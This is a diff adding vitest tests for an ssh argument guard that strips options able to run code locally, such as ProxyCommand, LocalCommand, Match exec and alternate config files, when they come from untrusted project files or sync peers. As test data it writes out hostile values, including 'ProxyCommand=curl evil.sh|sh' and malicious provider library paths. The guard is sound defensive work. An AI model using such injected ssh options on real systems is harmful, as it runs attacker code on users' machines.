@@ -2,6 +2,7 @@ import { describe, expect, it } from 'vitest'
 import {
   buildSshArgs,
   parseExtraArgs,
+  stripLocalExecArgs,
   parseSshConfig,
   posixQuote,
   quoteRemotePath,
@@ -198,5 +199,85 @@ describe('remoteTmuxCommand confPath', () => {
 describe('parseLsDirs', () => {
   it('keeps only directory entries from `ls -1Ap`, dropping ./ and ../', () => {
     expect(parseLsDirs('./\n../\nsrc/\nREADME.md\n.git/\nbin/\n')).toEqual(['.git', 'bin', 'src'])
+  })
+})
+
+// The exec-site guard (the `permissionModeFlag` / `SAFE_SESSION_ID` idiom: re-validate where the
+// value BECOMES a command). `ssh -o ProxyCommand=<cmd>` runs `<cmd>` LOCALLY through /bin/sh every
+// time the node opens — so a value that did not come from this machine never gets to carry one.
+describe('stripLocalExecArgs', () => {
+  it('drops ProxyCommand in both spellings, and takes its value with it', () => {
+    expect(stripLocalExecArgs(parseExtraArgs('-o "ProxyCommand=curl evil.sh|sh"'))).toEqual({
+      args: [],
+      dropped: ['-o', 'ProxyCommand=curl evil.sh|sh']
+    })
+    // `-oProxyCommand=…` is the same option written without the space.
+    expect(stripLocalExecArgs(['-oProxyCommand=nc %h %p']).args).toEqual([])
+    // …and the space-separated value form (`-o "ProxyCommand nc %h %p"`).
+    expect(stripLocalExecArgs(['-o', 'ProxyCommand nc %h %p']).args).toEqual([])
+  })
+
+  it('drops the other options that make something execute', () => {
+    for (const opt of [
+      'LocalCommand=evil',
+      'PermitLocalCommand=yes',
+      'KnownHostsCommand=evil',
+      'Include=/tmp/evil-config',
+      'PKCS11Provider=/tmp/evil.so',
+      'SecurityKeyProvider=/tmp/evil.so',
+      'RemoteCommand=evil'
+    ]) {
+      expect(stripLocalExecArgs(['-o', opt]).args).toEqual([])
+    }
+    // `Match exec "<cmd>"` runs <cmd> locally to decide whether the block applies.
+    expect(stripLocalExecArgs(['-o', 'Match exec "curl evil.sh|sh"']).args).toEqual([])
+    // An alternate ssh_config can carry any of the above.
+    expect(stripLocalExecArgs(['-F', '/tmp/evil-config']).args).toEqual([])
+    expect(stripLocalExecArgs(['-F/tmp/evil-config']).args).toEqual([])
+  })
+
+  it('leaves every harmless arg untouched (a jump host, a keepalive, verbosity)', () => {
+    const ok = parseExtraArgs('-A -v -J jump.example -o StrictHostKeyChecking=no -o ServerAliveInterval=30')
+    expect(stripLocalExecArgs(ok)).toEqual({ args: ok, dropped: [] })
+  })
+
+  it('keeps the harmless args of a list that also carries an exec-enabling one', () => {
+    const { args, dropped } = stripLocalExecArgs(
+      parseExtraArgs('-A -o ProxyCommand=evil -o ServerAliveInterval=30')
+    )
+    expect(args).toEqual(['-A', '-o', 'ServerAliveInterval=30'])
+    expect(dropped.length).toBeGreaterThan(0)
+  })
+})
+
+describe('buildSshArgs exec guard', () => {
+  const base = { host: 'h', user: 'u' }
+
+  it('refuses an untrusted ProxyCommand (a cloned project.json / a canvas-sync peer)', () => {
+    expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
+      '-p', '22', 'u@h'
+    ])
+  })
+
+  it('honors the local user\'s OWN ProxyCommand (a corporate jump host still works)', () => {
+    expect(
+      buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=corp-proxy %h', execTrusted: true })
+    ).toEqual(['-p', '22', '-o', 'ProxyCommand=corp-proxy', '%h', 'u@h'])
+  })
+
+  // Removing only the offending option out of `-o ProxyCommand=curl evil.sh|sh` would leave the
+  // orphaned `evil.sh|sh` in the argv — and ssh reads the first positional as the DESTINATION. An
+  // untrusted list that carries an exec-enabling option is therefore refused WHOLE.
+  it('degrades, never blocks — and leaves no shrapnel behind', () => {
+    expect(buildSshArgs({ ...base, port: 2222, extraArgs: '-A -o ProxyCommand=evil' })).toEqual([
+      '-p', '2222', 'u@h'
+    ])
+    expect(buildSshArgs({ ...base, extraArgs: '-o ProxyCommand=curl evil.sh|sh' })).toEqual([
+      '-p', '22', 'u@h'
+    ])
+    // An untrusted list with nothing exec-enabling in it is still passed through.
+    expect(buildSshArgs({ ...base, extraArgs: '-A -J jump.example' })).toEqual([
+      '-p', '22', '-A', '-J', 'jump.example', 'u@h'
+    ])
   })
 })
